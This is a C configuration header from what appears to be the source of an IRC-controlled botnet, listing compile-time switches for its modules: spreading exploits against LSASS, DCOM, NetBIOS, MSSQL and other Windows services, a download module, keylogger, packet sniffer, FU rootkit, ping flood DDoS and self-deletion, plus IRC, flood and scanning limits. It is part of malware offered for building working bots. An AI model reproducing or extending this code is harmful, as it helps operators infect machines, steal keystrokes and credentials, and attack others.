
//#define _DEBUG

#define NO_OPENSSL
#define NO_CONNCHECK			// Disable connection check before connect attempt
//#define NO_SERVICE
//#define NO_DLLTEST			// Disable dlltest
//#define NO_VERSION_REPLY
//#define NO_PING_REPLY
//#define NO_CEL
#define NO_STATUS
//#define NO_WINDOWCTRL			// Disable window control

#define NO_PSTORE
//#define NO_SECURE
#define NO_VIRUSREMOVE //crashes some bots
#define NO_SFCDISABLE

#define NO_THCSQL	//probably doesnt work
#define NO_WINS		//might not work
#define NO_NETDDE	//might not work
#define NO_SVCHOST  //might not work
//#define NO_ADVSCAN
//#define NO_LSASS
//#define NO_NETBIOS
//#define NO_DCOM
//#define NO_WKSSVC
//#define NO_MSSQL
//#define NO_EFTPD
//#define NO_PNP
#define NO_RECORD_UPTIME
#define NO_SYSINFO
#define NO_DRIVEINFO

#define NO_VSCAN

//#define NO_DOWNLOAD
//#define NO_CRYPT
#define NO_REDIRECT
#define NO_SOCK4SERV

#define NO_SPEEDTEST			// (10kb)
#define NO_RDRIV				// Disable built-in FU Rootkit functions
#define NO_FU
//#define NO_REGCTRL
//#define NO_FLUSHDNS
//#define NO_FLUSHARP
#define NO_KEYLOG				// Disable keylogger
//#define NO_PROCESS			// Disable process control
//#define NO_LSARESTRICT		// Disable lsarestrict secure functions
//#define NO_SYSINFO			// Disable sysinfo
//#define NO_DRIVEINFO			// Disable drive info
//#define NO_NETINFO			// Disable network info
//#define NO_CHECKHOST			// Disable country checking
#define NO_NETSTATP			// Disable netstatp
#define NO_CAPTURE				// Disable capture
#define NO_MIRCCMD		
//#define NO_SPY_WARNING		// Disable possible spy warning (will enable login through pm)
#define NO_PING					// Disable ping ddos
//#define NO_MELT				// Don't erase the old bot once moved
//#define NO_FCONNECT			// Don't connect to 'cononstart' on startup
//#define NO_RECORD_UPTIME		//
#define NO_INSTALLED_TIME		// 
//#define NO_AUTO_SECURE
//#define NO_SNIFFER
//#define NO_MIRCINFO

#ifdef _DEBUG//leave me alone
#define NO_SERVICE
#define NO_MELT
#define NO_FU
#endif
#ifdef NO_ADVSCAN//leave me alone
#define NO_EFTPD
#define NO_LSASS
#define NO_NETBIOS
#define NO_DCOM
#define NO_WKSSVC
#define NO_MSSQL
#define NO_THCSQL
#define NO_WINS
#define NO_SVCHOST
#define NO_NETDDE
#endif


#define PING_TIMEOUT	3600	// If the bot hasnt recieved anything in this amount
								// of time it will quit and reconnect (s)

#define IRCLINE			514

#define MAX_TOKENS		64
#define MAX_LOGINS		3
#define MAX_THREADS		512

#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		18
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22

#define MAX_SCANDELAY	60
#define MIN_SCANDELAY	3

#define MAX_SCANTHRD	256
#define MAX_SCANTIME	9999

#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383

#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX

#define FLOOD_DELAY		2000	// Send flood delay (ms)
#define SFLOOD_DELAY	7000	// Reconnect flood delay (ms)
#define RUPTIME_DELAY	600000	// Record uptime check delay (ms)
#define SECURE_DELAY	600000	// Secure thread loop delay (ms)

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#ifndef SIO_RCVALL
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)
#endif
